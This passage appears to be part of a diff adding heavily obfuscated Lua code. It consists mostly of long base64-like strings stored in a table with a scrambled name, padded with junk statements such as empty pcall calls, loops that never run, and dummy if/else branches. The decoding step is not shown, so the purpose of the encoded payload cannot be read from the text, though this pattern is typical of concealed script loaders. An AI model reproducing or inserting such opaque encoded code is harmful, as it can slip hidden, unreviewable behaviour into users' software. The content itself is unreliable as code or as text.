+_lGHIJKLMNOPQRST_0oabcd[62]='+/G+pODTv9ny6rLzuOPNzKT96r64/um57eDuoO39vfPy6L3M4/zp7qDesr794OXZw/28oPjS0bm90u/zsuO98/+k6vPb+ejR5bPmzPHs0b7h+uekuvqz48zR6tnJ5dLZ4tGyoMfk6L7u3s7M5fvRwc7R6dzju+/JuOK87uDfvMTy2L3mvennoLjjvL7O2eDm/tLR8/35v+bZ873M4/+9yef8zMTk2urc8u2/7vPj4Mzb/bz+/NPM/d/k6Mz42L3zyf/O7rLg5vP/+s3b3/G989v56KDy6qDRwfnmwdm46qCz0sPc8tGk4+zp78n5/7++7O7m0bzgvdOg6b3z5b6g4+Tuw6Ds783J8fvpyfv+vLnZ/+7jytPOyfje5vPl+syg2eCyw+TpzLnn5L7z'
+_lGHIJKLMNOPQRST_0oabcd[63]='+6TNwePls+Pv/b/u++W88/7Yzbm70+7uw+Tnybz756DB+uruve/t3Lnq7qDt5O7b2NPq3PHl6O7D5efJ2fzq0e7vve77v6D95/nqycDvzP2y/uDJ8tHg3OTo5uXg0e3Zu9Hlud/gpP7i06TcuvPRzPuzzPu73szl/+G9oOG/vLnu3s3EvdLmuLL50cOy/eXj7Nng2fuk5dnA2eXj/OnloODS6eO6vOm+5eS8ye2/vbnl++agzujm/fuz5sHg77zz4+DlycTt5cyg7enZvuTM7uGzzNOz7bzz7/zp3Obq5u3l8ebZ8u3DwfjYzOb58b2+svng++fl7dO6+ObE+tK+w/Lq6P7l+Ob98eLOycLZ4O6k+szbzNPMoP/jzvvf+ua5/+S9uOO87u342MPT'
+_lGHIJKLMNOPQRST_0oabcd[64]='4ezMvs3kssni6e6g772/4+2gvr7g2OXu8/rMyfLa6sn42sy+4NHt/vP65ua64LLE5O7q5s3l7sP+7s7Zv9Kg/vuz6tPj+OD7s9PM7f/izMzts7zjsvvDue240r7Z5L3j4fnD2dnsw7nn/OnJ4/Pq2+Pi5/P83tHBuuDS2fH65rnu3r3BxOjpyfjY0uOg7eb+ztrpvv/x5tv42cPuuerS/uTY4MnY0++4v+/m28H56aDx4OW5zOnOyejq0cTjs+Cg4tm8zO/yvr6777/c5tHt2cPs0fPtvNHE4O280eLu0cTtvL2gzNLo+/H+4Oa/0ufDytPo3P7q4Mz43u+g5NPS48DS5tHC6Orb2/6/vsHj6rnn4O2g+ujO/sTT7u6k5aD77eC+yfvzw+PB+7PM'
+_lGHIJKLMNOPQRST_0oabcd[65]='2bi8wbvow9zK7dG4vOK+weze4Mzx4uXusuCy89m/pMTt8r7M4/3lyc350bjv5ejMpOC8ufzZ0bjb5e7b5O7Mye3x5tnM0+bB4f3pxMztvr6+5OXz2fvvoOPl4MnN++bj473uoP3/zu6/6qDR37/RvvLSvObu076k7tjp8+++zNH77My4vd6k3OLt5sHK0r/uu9HO/u39zb778urEuvK9vvLo5aD54L39pOLp4+LR0b7ZsuXBxO690+Lu6uOz2MPB+f/R89m9w8y+4s7RyezR28rTv8y6/73z7fuz++7essy447+g3/q+wfu/zMTtsrzc3/nq2fv7vb7t+szEw/28/ufj0sza3r3R4ui/0bnqoLjZ+L3B7b7pwcP/5cmy/ur9oOrqoOH8zb6k/8y4'
+_lGHIJKLMNOPQRST_0oabcd[66]='8//ooPzZvPP40uW5vdHvubL70aD42L/uvvvuvsf/zcTM7ubl/tK9w/vkzsn/4rz+4b/l2fm/6sHl8eXZx/3p89v96dzB+9Lm46C/zNrZ0bn/5b/c2ujq/cTtvPP58s24+b7vwfuyztntsufB+728ufLv6cyk/erZv+7l2cnlvP766Oe++eG9/ujaztHO7dG4yfqg0+X/6KC537zR+N7RzPv7zcnB+73c/N/l/uDt5v3N+8zM+u7SzM7TpKC56ejZoO/ooP+96dHl/+e577690fP4zNno0dLJ2/qk3P7e5tv7+rzzve6/7vLq6rjE3urc4eTq7tm/6sPy0s7+7/Lm3P/zzMnY6ujc/NnS3MP4zPPM7enJxO7O7u/k6b7k6ODZxO/muc7ow8zm2OnZ'
+_lGHIJKLMNOPQRST_0oabcd[67]='5N7S5t//6v346NLMpOzp0//goNn+6Omg//vtoO/gzsnJ4ee5/tHp5u/zvcTjoOW5vuPp5sf659vb+77Jwf7nvvns6u7f7MzDxO3q4+Le57jA7czR2b/l+/rTzv7O6uXBsuXRvv+zzOb8777Bu97uyeza6cn46Mz9weXvpPH6s/v+2c7m8/7OoNrovcPm07Og4aDR28f6vsyy+eqgsv3NucPg7v3k77++7NKkyee4s+7N+ujM+ePmycrt5ePb7OqgvOTq5qT64L79/+bR76S9477kpO7O373mu9npxMn9zczm2unB5ui//rve4O7y0u/zx+TpvqDtzr7h8tLc2tLl5v345sS93szj+t7RxLL7w/Pv++D+svnDycf+6r7hoLy5wtPnoPPi5f7J+8O5'
+_lGHIJKLMNOPQRST_0oabcd[68]='8/jM28Tesrm77tG+x+Wgw8PgveXB+Myg4b/vuPLp7fv40bLB4unDuf7qoMny7cPuuvvM/d/65ebj+unEue/O5rnvw8Gg3+bz4Ono/rqz6dHa6rzR+7zM2+e/zO66++rc//rRxLq/zPP5/My52fHm+/jo0qDv+On++7+8yeH/777B++7D++C/49/g6u3M7b7B7bzMuL/qpOPf+Orb8f/q8/jRv/795NL7vOK+ye2k0tnjuO3z473Mvu/7zPva2c257unq/b3S4L7Y6r/ZzeWg7rLj6sPi6u3R8u++ubPRzO2y477BpPu+w83iw+P5vu2gzf7M29ni577y06DMuvrq5eDR78Tu6uXuv+3S0eX5w/u6/+q53/vqxL750qDE07Kgx+PlxMTew9O84uXZ'
+_lGHIJKLMNOPQRST_0oabcd[69]='pPvuubz9v+7D4Obz7eXo0dmk5tvj/uXjw/ukweWyw9Hb+LzmweSyzOLp76Tb++q+oNLg2b3Y6tP//Orj2/7NweW80tHZ47zBurjuzOHk7bnN/87uzNLD87ryzMz95bP+2bzRxLL6oLnvstHJ7bik87qyv+b40ujJwNG8zNnz5e75+cO+5bPgvsTSzOP66OfE6NnD7r/SpP7E3tG+u+m8ycDY0r7Zu7Kku9K+8++7s9nlu+XcvOXD3NjZ6uPD5cPzu9O8ufLSve7u6sPz4b6/2dn6pOP75ebzv9K+zMPlvPP5v6D+8ePSoMru4MnD4bz+pPvRvue8vMn82OW5/+TS2fns6cGg0+XuuOS9uLjj5tmg3u775u7SyfrR5rjv+++55t7q8++/0ty57szt'
+_lGHIJKLMNOPQRST_0oabcd[70]='5aTN8+X9v+7vve7z4bzu/sfj5vvb5O7c+/jM7rzhvdyg6sP+4eW9+/7qvdnvoOWgsuSk5srTvsT7v+a42fi848LqzL7t4r2+7fm9w9nl5czjoL/mweLS47ve4KDu06TTuOK9vuLtv+7a0qDm/eHlyf/gzKC7782k7/7pvvP+59vt+6TZ2f3q0cDq5tn+7b2++bK92+btw9Py0+q5suTooPuy5eO8/+7R2/3N2+Pg5u7fvua52bvvoL/Zvbnfu9Lu3/u+yfPs0uO45Lzu8u+9/tmz5cHo6L2++ui/vqDe7sTfsujj/+TMw7q70fPk0sPJ//zpub3v7qCg0tLc4u/m3Lz75e7E2s7R4u+9w+jR4KC+4tLj7eDO2f+94O656rLD8eO9zMDYzubf88zb'
+do _1OIJKLMNOPQRSTUVWXYZabcdefghiCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijkIKLMNOPQRSTUVWXYZabcdefghijklmnopqrstVWXYZabcdefghiYZabcdnopqrstuvwx=IIGHIJKLMNOI_XYZabcdefghi1 or 940 end
+if LMNOPQRSTUVWabKLMNOPQRSTUVWXYZabcdefghijklmnopqPQ~=IIGHIJKLMNOI_XYZabcdefghi1 then else end
+pcall(function()end)
+do _1ILMNOPQRSTUVWXYZabcdefghijklmnopqrDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmn0HIJKLMNOPQRSTUVWXYZabcdefghijkl_=_1OIJKLMNOPQRSTUVWXYZabcdefghiCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijkIKLMNOPQRSTUVWXYZabcdefghijklmnopqrstVWXYZabcdefghiYZabcdnopqrstuvwx or 83 end
+_lGHIJKLMNOPQRST_0oabcd[71]='2frt083+5dnY3u3muvjpxMf/vNy8+qCg7/O8+7vRv8zH/uDM+/rmxMrR6czY0+7l76Dm887tvbm57erZ/O3O7szRv+PM2sOg4N7g2drqs9Hn+b7DuuDpyejazNv9/ea4/Ornw/3sw/P94b3tzu28oNrR0aT5/r3m4+C/5vv+0tzl+u7z4O3D2dny6czo2M7Z/u++pO/95v6+5aDu576/5rvY6tzO78y4s9PRxLvesr7l7NL+7ePO3OG9vNzjvc3B/trq28Tv7dHo06Tu5u7DzMP76f7H5OXj+f/lyd/9zMPx5L/R4//u8+3loLj5+7zTx/vq2aTlpNnlu+n+8tnq5vzqvNz/vNLJ2Om9+9jT7b7h88PB8unm+7ziveXt/ebB++TDyfngve7jvurR'
+_lGHIJKLMNOPQRST_0oabcd[72]='uuTO7rL659u44Oe++bLm+9revfOk++7buvO+vvLt56Sz7ueg5//p3L/ZzMyg6ejRzNrpxMDTzLn+6c7M6NHMoO7tzNztvbzBzNGk3P3+vsO93ui+wfnnw/rRvb7jvubtwtOk4/Lu0vvz+u25zOnMoLq4vcTa6tGkv9i8xPu95szx/czu+t/m7eTpvbn5srzE5tm+zM3k5tz/4Obt4O/g7r3ZzP77887Rv+rp3L3pw8HY6b3+wOjmzMTYzMnA2OnRx+LSzOjq6tOg6u3J/tHv8+Lq7v37s9LJuOSk2eO76Pvy2Or+4eDm4+3iw8Hlv73bvdPpwfHi5vvh+OXc47/l87nSzu767r7B2trpxOXx5ebm3r3j7fq+pPnk6sz6083E+77p5s7p58nvuL+g'
+_lGHIJKLMNOPQRST_0oabcd[73]='2bPm2eHizcHvuLO+776z/s7q0u754KD9yfq/2dvi6sny6r3JpPnD0f//vsnN4+bts9Ptvtnj0cT83u7M7O/g5ujq5/PK0+fJ+f7m0b746dP74r3jweXqvr3Z6r6k4KD+uenpxM3/w/vg0uW+76S8zMTTvKD74szT//K+ye/ivO7/vL/RweS888LqzObl/87u+tLm28Tq78zZpOW54u7MydjqzOXa0u7B57/p5uDv78Hf4urM77u9vuTu6tPl5Myg3/PNpPzTs+PH+uDJ4fvM2+H86e7s6bzE/7jDzO7Yvebl+rzZ+eW9ueXj6qC90uX72eDq+/mgw8no2szj5+Wk09/szcHJ+L252aC82fzSzdvK0b6kwO3MuN+yvO75v+/D+ti848LY4PvE2s24'
+_lGHIJKLMNOPQRST_0oabcd[74]='suDnw7z+6dHg6NLM5ujl5r/u5e7g07PM+/3qw+W97ea70+ig47/t/rPt6uPH/+64+t/g2aT95ebh5Oa4ytGy2++gw6D42bzjyfjDwbz9w/vl8+XT477NvsHl5cHY0ejc7N7q5aTg0tzZvb64v+rO0eDT7cHjpL/R5uq9uN++0aDtoOa44fqguOX94Nm507z+uOLM473TzOa/6u797Njm/vLq7aC6+73Z7fruyfv50r7+7erE8tKgyfvszvvx+L3u5fm/49v9vcT58+bu/NO+ub77zNO52b/mu9HMuMnlzczf5erB773OzLrgvsPk782g7O++yaDq5dHN5KTZ7/zM3PHhvObn4Oa+zOjNuef76cn5/ebuv+3NydngzMPv/ebJzNm+w/u/6uP+3r3D'
+_lGHIJKLMNOPQRST_0oabcd[75]='5/7q3Nmz6dnN+e3Ms9Kk++TRzuPu6u3Rw/vgoPrR76DhoL/Zv9POvuP6zbjnoODZ7/nloPjYw7nO0e7TvuTu28fj5ea96L24wujMxLPqoMP95L+guuHn27vo0tHu7cz9wN68xNmk6v7/4r/Z8u3R8/v46rn/4sy45/rvwfPhvea8/9HM+/rp08n45qDB4NGg/eLDvv/6oPPM6L3bzeLRud+8vcTD/c3MvejpvuG4oL786uncv+np2f3k58zY3+fz7fK9ue370czj+7/j2b/D0djt5ePO7uqgwfnS47/pzcHjvOm536TMvsn/6cHH+L6+x/3p0aDv6ObO6uXjvOC8wcP66dH40bzmwum/3M396uW96b3Msv7loL/p7sz7/rzZ2urD7uXg5vuy5O7Z'
+_lGHIJKLMNOPQRST_0oabcd[76]='7u/uufH/zLnC6b/M++Xmucn/zu7Z4szl57Pq8/7o5e7K2bzJ+frg3P7S4NHA0enm+7i80+O70cTM0+fJ4f3M7uHy6tzz/dLc3//RzLvo4Puy4On+8/vM473vztn7ve7D2ti+87rivqDC2dL+5eTu5v7S6P6g7cO56O7moLLls+O6+erjzf/p3Lr7pNHv/8zu7OnSzNm9vcP7oLz74ujlucn+vLno2L2g/N7q7vP+zsy977ygyeO80dvg6dHu6qDRw/rlzNn40bnZ87/Ms9i8oP+46rny0eeg3+XMzN/4vMH/47zM47zu0eXs6tzf/9HJ7/u90f/66tmk5b3T/tm92fu/vcPv+M3M4eLm5tjq6fO56b/cs9K/3ODe4KD9++7z8eDq3PLvvKDj/8PE'
+_lGHIJKLMNOPQRST_0oabcd[77]='yePq/djRzNnB5KTEyfqz3Pv7zczh8+bz7fzpuebe5/Oz6M7u4OrNwe2zzMzz/tLjvvjMuMnl5u3s6MO5oO3nw+LR6Mza77zM/NHMoOP/6tvt883z6Oi8ueX4zMHjuL3uzN7mvv7q0v644ODJ7fu90+/gvqDn4urEyePm7fro6vvj+L39/+DMueWz6qDy0ubB7eO95eTev77Zu8P+vejgyeXlpLnl+Mzu/N7moOfi0cP/uO6g2f7p5r3o5fvl+tLJ6O/uueHgoNHM7+rz4/zq26Tg6v6/06T75NnnoOe+w9HD5b6k7u/o5rvY5e7B5erR7bvD/u3/w/vY7tLR8fnM2ee/6u7y7+q+4NnO5t/l6sz5/b7Eu+nt8/rtzv7x4ubb8frm/rL9v9z58s7Z'
+_lGHIJKLMNOPQRST_0oabcd[78]='u9i95u/75b6g0+b+8tm/4+X4zu7o6r3zw/7qzOXls8nN7Orl46TOzMH46ebl5aTcvuXNw++/zPP5oNG5wezq28P7zvvi37/m2O3S+9+9oNu+4rzmvuS8++G4vNyk/7zmw+Tnycn77fug3tLJ5NHO2fLYvMHj5Lz+6N6yxL3a0bnj5Lzj8fm/0b3vv9nt/s2+2eXq2+Pgzsnx/9HMweTvxLz456Da2by++NLozKT9zub7/+blv+3q3MP6s+7b5Mzt5bLq88n6zczN+sPjwNnD2bjiv+7lpLz++f3Mybz7ztnC0eX+4aTS5v7Rvb6k+erJ7Nm//uHzw6D7+NLZx/vDvubq7eb5/tLm4fvRyeDYvczj4ea58eLq07/q5cHK0rz7yezpucP56tvm7+rJ'
+_lGHIJKLMNOPQRST_0oabcd[79]='x+LO5tn6zNGk+Mz77b7Mw8P+5v3C6tLR7bzq5rL5w+7K6qTZ//nSyf+85tnB/r374/PqzPvjzLnK2b/mweK8yeLR6u6y+ei+x+Lq7uf7v8z789G5venD2dm9vP7n+b/cvvjq4+P50bj//+bJ8/jNpMLZ56C6uO37u+m+xNjqztHY0u6g/eLRxPP/7ebfpNGkzu2//tn9w9nn/M7m/fjlzNrp7vP7pNLR+eTvyd/s0smz78zm2Ojg/t+z5uW45er9wurDyd+z6aDz+9Lmv9PRuMTo0v7s6e37svnD0bvYv+b82czl37Lt86Tlssnx4Onm+7zq5e3z0u7t7M7RwNPSzMfgvOP5u87mv+q8zO+9zMPf+r/J+7zo0fzqs+bm6ebt4NLu8+Lq0bm96urm'
+_lGHIJKLMNOPQRST_0oabcd[80]='2eK+wcH6oLny2tLjztPp873e0cy8+e3R4/Hl/r/p5rjhu+nMwfvnuNvsw/vo0+DM4tPo3N//6P77uLz7zfrm3PrT7eP/8urJwf2+yeDe7cTluMzB2/6/vqT4v9zb5cPB5tLNpLz+zOaz6Ob97aS9vvLtzOb62MPEzO/gzM37zO3jsu3+wuqg5v/k6rn43r3t4aDq3P/45qD5srz+57vO3Lz66dPj4ubt7NPvoL/evsni0c7+4f/t0br+0cng6qT7uem+uM3jzuPg3+b7zfnu2crev8nvvua5svvqweH40u7k6qDD3/q/0efy5uP42erM//3M/fzv7u2y/ee+w//u/t/9vP75+e+4weDp7rPR5e673tLmuOCg2e270r7y0+Dc36C+28f9vNy44um5'
+if _1ILMNOPQRSTUVWXYZabcdefghijklmnopqrDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmn0HIJKLMNOPQRSTUVWXYZabcdefghijkl_~=I1EFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxjklmnopqrstuijklmnopqrstuvRSTUVWXYZabcdefghijklmnopqrstuvwxyz_Zabcdefghijklmno then else end
+if _1OIJKLMNOPQRSTUVWXYZabcdefghiCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijkIKLMNOPQRSTUVWXYZabcdefghijklmnopqrstVWXYZabcdefghiYZabcdnopqrstuvwx~=LMNOPQRSTUVWabKLMNOPQRSTUVWXYZabcdefghijklmnopqPQ then else end
+_lGHIJKLMNOPQRST_0oabcd[81]='4b2yvvH/7bm90erm2ti9wcDf577C6s3D7t695cf65vPz4ObZ7tG9/u3k5b6k4szzyeTnxOWkv8nfvMO+77PnpOzo4NHlu+7bztHqvsTp0bnh+r/cwOrRvuW4vbnt/9Hz+tO9/fn/6cTb+enMzujqwdni5dHvvubE4f/lubqyv+7D4NLms9LOvsH/vr7u076++eWg7vPszu7u0+XJ7/nO5uTTw6Do0ujRuP3mvv+/zv7h+unT+u7M3Nnj6tPA77zB4+PNwebpvdv47+eg7Om/7sDY57672czb5tPtvvro6tOg37zZ+eW+pLq96KDZ+Oek+eXm5uP76sPu2czRx+Ck3O+9zNzZuLzEwujp7uPk7vPi7s2gyezNwcn74Mza6rzE/7zvuOHi0sm65LzM'
+_lGHIJKLMNOPQRST_0oabcd[82]='2N+93PrpvNHvv+7tyt7u5vP5vPPy0ujjuuXqycDf4Nno2cztzNHm48TuzLm6v+jc2eO8/sLR0uOy/s7j4//Ryd/40vu6/NLc4t+8zPvgzbjt/+r75+PnuPH6sqDl4uWg7b+gxO/gzMOz7ufb/+O+pP36vdHN4ebTztLu2+zo5e7E6ufB6O/luf/k6syz0ry+373R29jSoNPj4uXB++Hmycfh4L68+Lzz4urp2cLqsrm70aDt4fntwbPR0czg3ufE7O2/+/je0cHjvqTZ+aTqwdv+6tPz5OfByf/g2dm74NnZoL3j5eCkwaDe6e6g07LB5ePmvu3l5czf4NHz7tHvyezuzO760rP74bvNoO/izfPl++nz573q8+TSw8S6pL37u++83Lva0aS77rzu'
+_lGHIJKLMNOPQRST_0oabcd[83]='5u/t8+bYzO762MOgv+jm5rPS78HhuL642f3m0f37w9PY2L7J6O+8+/+758Pu6ObTvODnwbvZvMy/08zm2/qkxMTS0cTv+em+oNnm2/7uw8nZ/+/BudO9083756T+0urDpOXDxOH56u7M0c3EurLm3LLiw/6++86+7/i9+8ze0u696u3BzfvRxMrqpPPE0unc4/3nud/+vLn/vaTm5O3OvuXzzP3u3ufM5O3O2b7k6qDu6eDc3/qzycTRsr7l473c/ujpxOP56cTv/83b2tHDwcP46ua97dLj5b/mxPPkzOW4+em54fjpvt/k5tu76b6kvd7N28ru0cHY2cOgsvrg++zZv+b5pL3+7+Pl08nh5cG97ur9uvvMueH7v/7s7r/Js9Lp0836pMy++czM'
+_lGHIJKLMNOPQRST_0oabcd[84]='x+PNubzkoPu+4KTTw+Tp5u3hvb6k+L3E+fnRwfvy4Mnh7MPRudOz7uW+6Pvi0r64+ti97b7k7ebK6uXj/t7m3NvivNOz6ua+5/7M3MH+vfvnv+7z5Njp5uXlw9P86c3DwfrDvvmzvqT9++XM/7/u/bne5f7u2NHJ4tjS2fP458Hf+ebm/+zpvue7vsna0dKg7/68oPzfv/vK0eb+7t7RoLj+5tno2c7R4/PqoNv/6L7j/s7MuOLD+/jqzcm96czz7/PqoMDv79vE6cO53+Sg0/n5v/7t+erj+O/ooPu+7szC6u2g4b7tyeTqoNna3uDM//Hm0+Og6tOg2s7+zO3loP+8zMnb5OnRv9LvoOf/w8Hn5KDtweTuuPjp5uOg3s2+vdm/7t+40cO+/76g'
+_lGHIJKLMNOPQRST_0oabcd[85]='+tHNye//5aDo0b3J7/rMoOH/78n/+cyg8/nMvtnsw6Dl+c252/rO2c3l6OP//MzE/eTvubr7zcn7/+7M+tGyxPH7vKD40ebJwN6zoPn80r7/uL3T2+Pq4+O/w9zj/Om+47/qzMDR6bn55On73/uz3Obq4Ny64ebZvdjD0cH9zaTx/7247fu/zPrfvcy6pM6g++TDoLnq7fuy4Or9+unvuef9zu7s3tG+w/q+uO+7vsnj+rygudKgydjSzL7nsuXMuP7g7ube0v7/4urJyu+/2fvzzaTtv+ncuOTmwfPl58zjsufJur7l3L/T0aDH/eXBv9Po7sLYvf7+3+DuzNjm06Da6tHC0rLbpPnq8+36oNnC7uCgw+C+88ruvNG+5erT+/zp/u++5szM6erM'
+_lGHIJKLMNOPQRST_0oabcd[86]='wNO9we3lzMnjpODjuPvquMDeztzu7+bDw/i95v3szP284Oa5vPrvyf/i5snlu+7T2tngoOek5r7h4unJ+t7mufmk5uXa7+7lyt7M+/+77uP40uj76O/p5qTkw+Pl8uncwf3quN/70tm64r3b//29++DRzNPs0+79+Oq9xNrozcO847/u7b2yvvzS5vvk2L3lytHl+7jkv8ntoMPEwfrRpMfkzPvo2ODR2ujlvubt0dvO0ur++fvSoMrS5sPB4rzE3/jS4/zqstvo6ODRpPq+uPH45cy73rzcx/3goO3k5vvh/unu+b294//55sO/0s2g7eK8/rvev8m4+czzv+/qucngvMTY2M3b4bvu7e/6ssPZuL6k2eC9++O478HM0efzwu3D3O3z5ebD+Oq4'
+_lGHIJKLMNOPQRST_0oabcd[87]='w+G8ybnSpL7Y7cO+46TS/qDovdzlv+bR2ujmzO345snm3+W5oNm9oOP/7v7u0aTmzNnMw+zu5/PZ4+nj+NHMoO276f7o7+DczeSk2bq7pNH7u+DR4/3g++DRzsz7vr245/rvuM37zb6k4r7zzfvmwfzt4O7v5NLc3/K97fv55szo0+ju2u/p/ujqvePJ5KS5+/nOycnk5ub54r2g2/q8xOLtzaTm7uDmu+3M5bL+vfPO786g8+Tq3LLl6bm65O7jyeSg5rrs6tm70+XJ37vm0/zqoMT62L3ZuvngyfmzvNHn8b/ju9Lp8/vyvsnZ+7zB8t7q/f/46e7H7NHB5/3R87va6tG8+erjzui8ue/8zcS56u7z/+DOoPm4vf7D+9Lm2f288/3/0cTZ/eb7'
+_lGHIJKLMNOPQRST_0oabcd[88]='7f7q0+7uvdv/vurZ/7LpwcrR6eb+3um5weTMzPu4oOP86c3b/f/M28zS577J+ubt2eDMvv3gzP367um5376kxM7S5ePA0uigoNrMw8DS777J+M2g/f/OvvLuvr7z+OfJwfnqwdvjvf7j4b3z5ezqvsP/6tv40u7MxNO8ycHjzOXv8s7J6O29oOXk7rmg0erD8tLRwcDe7sS6uL3m2Om9w9nl79vv5cPm8/vpzOXhvea6vqS++f/OvvP5zcH74ua+4/rRzMrS5fP/4tHB+eK8+6Tg5cTz++q44N+/yfmk0uba07K46O/M88HlzLm50u7EoO3S7sn90fPE773tweLO2cf9vL64+r/c/+Xnubr/vKDlvO3Bw+S9/ezR0dvl7MO+4O+/4+3k0czn/r7z'
+_lGHIJKLMNOPQRST_0oabcd[89]='4N6kvuDo6ua64ebMuvjq8+P5zuPl88z9uPnNwcfgvrnY0uDjpOG/0fjtvKD55byg4aDmxO28w+O++cz95/vNwf357dzf47yg7/nMzP/i5cGy4LPj4/jD5vzSzO3Zv7Kgzfu9/t/g6cHY09HB5b+/7vP6vLnfvMzl7+S+uPni6tm84sy+++Dg2djv7b7v+87u8f/mvsH6vsTD48zMs+ng2dmyvfPz+ufb2Oqg0cru58H62bzj/f/D/u+9zvu8/b3B6NG+vrq4zO284M255Ni98+DTs9z9+Mz9uuG9++btvdGk+qDB5u/q08f4v/7g7ubM/7O+ufv/6f7l4MPEwNLn89/zvNO8/76kvODDvsLq6e6909Hzx/vvvr/Rs/7fpL6g5O28vvLo6aDx4+nz'
+_lGHIJKLMNOPQRST_0oabcd[90]='5eHl5t/g5rmg7c7++O/Svv/6zaS84ubt4trp3Pvz0bjM7+7BwNHD0aDv6ubJ5KDm8tG9vsTpvqTH5M7c6O3g2fHjv9nE6ry54eSgyef66cnZ5e+42f/t/uLZ58ns2L3R8uq84+/+zL7n/b/j47vRvvm8vMHvu+CgpP2+8/zuv8nj4uag5f/t07PZvdHC6e7bx/rD7u2/0b7x/byg2+Hg/rPqpL7b4r3BxOrOzOe+zPu64+rJ2unpubL70tnY2s7u4fzMyb7j5tvf5bO++/LnucrTzu7s2ee52O/tyeO96P7v4Oig5urN87nessn7pOa5zfvozL750vu4++jmyeK+pM7p6uXj5bPjwf7q7bjkvePhv6C+37/q/tmkvszfu6DE/fjS+77loLn9/8P+'
+for _=5,4 do end
+while false do break end
+do IIGHIJKLMNOI_XYZabcdefghi1=_1ILMNOPQRSTUVWXYZabcdefghijklmnopqrDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmn0HIJKLMNOPQRSTUVWXYZabcdefghijkl_ or 59 end
+do I1EFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxjklmnopqrstuijklmnopqrstuvRSTUVWXYZabcdefghijklmnopqrstuvwxyz_Zabcdefghijklmno=I1EFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxjklmnopqrstuijklmnopqrstuvRSTUVWXYZabcdefghijklmnopqrstuvwxyz_Zabcdefghijklmno or 302 end
+_lGHIJKLMNOPQRST_0oabcd[91]='2b3u0bzszMO96L/R+Ni/vu7p76Dvv+XE4f7M0ezuzb7v+M7M8f/u+/P/vOPfu+DM2fLp+/3+vsTN5L/J/7LuzL/qvPO72bzzvv+9zO+8vO6z0+fE/7LM3Nv77tni0r7D6OqyvsH55tyg0dHJw/3n2/rv7snt4LPM//PRvrrhvr690bzcwNHNpPLZ0cS/37zEzfuk3Nvi5aDb4ubzyeCgubq9oPO/08PMu+nM47Pt56S96ej+uvO9zLPp6PvY3+XBuuDS7u3z6u7s0emgwu7DyeHjzMPm6uq48+zM0b3YzP650+2g2eS+zOO/zuak+eblwfvp2e/67fPK3u/b7eHnoOH7vL7j5ejRs96z2fjT5dzM0ubl2f3M7f3loP3D+eC+4/jm4/3gv9z/5Ofb'
+_lGHIJKLMNOPQRST_0oabcd[92]='vdjmvrnSoMH7vui+yeTMoMTvw/va6dL7weG8wb7izMT7u9G4wtHnwfju6f760b3b5ui/5ujeoNu8/szm373g+8DZ5tm8+ee5s97gvuX76sH/+u+guvPl7uP7w9O77enux//vuNmy0tzfveW58tHRvr7j5sznv+D75NrS5qDZ59uy5cOg7Om85ufl6tu++dHz2NG+26T45ePn+r3msuC8uc7q58G84uDJuOXp/u3/zbn+3qT+uOPD7uGk5tnJ5M7m3+TDuaDfveXa2L39wO/qyfjo6v3H4uq45tHRyfLt6e7t5b3z+tHg3Lj+6vv/oL/JpP/nzM346f7E0rzc4bPqoMLo6cnhpOnZ/fvq0+367snfu+nzv+3O5r3p76D74KDtzeS82eX95ub5+8O5'
+_lGHIJKLMNOPQRST_0oabcd[93]='xO/u/sP/zMPjoOnuzfru/rr45sHfvLy+2unpoKTloOPl+rLJ2b/S5r77pLnu0+3u/Njm7r7i5rja3qTB2ujgyf7t5ePi7eag5b3vpNn/6cm/6ue++unO/vH/ve7h+tLJ/N698/rp6L66+L6+//rtwcra6tvtpLzzs97D8/jR5ea+4ufJzO/vwfv+4Nzk2OX+yuqk8+LZ5fPm3r7bxNnnzMDTvtvj5cPmu9/npPra6fPb5bzm2+TmoLnqzMSy+9LJ4aTp49rt5sntu765vP3mybzk5vPjvb25x+XpyeTR78Hv+7z7ztLu8/nyvcHJ49HB/tm+vvLSs9y85Om5/+Dm5c7f5tvC6s3B7O7Rufm/pNm44+Xz7tOkye3szcT7vr3Zzujq0+7v4Nzlvc3J'
+_lGHIJKLMNOPQRST_0oabcd[94]='oOjM7bqyzvu45M7mytjp+9/k6tzjpObJ4bigvtvkvr7jvbLMv9G9ycPg5szt8b3l+fPnpObZ57n86dHE7NPu3P7Sw+bjvqDEzO/n28HlpPu+5dHzxN/m3Lnqs6Dm0r3z+tPO+73u6cnB+7/++/6907z5v+7o0uWgvP/g3OTuw9m4/uqgs96g5rna0tm6/8z+5bO87sDRzL7D5efDyfrO2d/i4L7Y6ue++/vm8/+96b7g0b2+7+W8/r3Rw8T95OncuOTl+7jgs+ag6L3b+O3m7uWgvdnu7tHzs9Lqyfro0du56dG5uuLmw8PlsqDx4eDmxNK+oMn56dna2czuwtKg3Mztw8zN+ubDxNGg/ubevMzfoOnT5NLgvuXlpPPm09Hb5ezq/s7p57jZ48zz'
+_lGHIJKLMNOPQRST_0oabcd[95]='5NrqoL79vL77s8PR7Om/++Pg4Mnh4KTzxO/qzMDY5vPi0+jJu9jDzLrjw/P//ebtyt7O2f//ztnnu82g4fO+w+/izO3b/r/Zue/m3PPgvtvg6rzMoN7ooOO4ztnN+7/JwNjS47Pe0szg0s244eXpzMrS6uW70+7Dv9Luyb3Z6szv/ebBsvnquOjp0aS+5Obt5fO+weW/77jN4uq+svvRw6DtzcTZpObR5eXD3LPqvL7lpODMx/jOoOH6zb79+uq4wN7vw7Lk7sTl/Orc2fLD3MLes9y/7r3uytLqydnyzuO90qTJ+f/u5b/ZvNmg7ur7+OjRyezq0qDo7+XBpOPg2e7uvPP75L++5/i947j/zMH80+3J6OrD0fjZ0v7t5LzMwfrm89rTzL6y/sy4'
